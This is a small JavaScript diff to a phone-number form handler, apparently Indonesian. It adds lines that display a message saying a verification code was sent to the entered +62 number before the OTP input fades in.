@@ -15,6 +15,9 @@ function sendNohp(event) {
          document.getElementById("back2").style.display = "block";
          $("#formNohp").fadeOut();
          setTimeout(function() {
+            document.getElementById("alert").style.display = "block";
+            var nomor = document.getElementById("inp").value;
+        document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor + " via<br/>";
             $(".bgotp").fadeIn();
             $("#otp1").focus();
          }, 500);
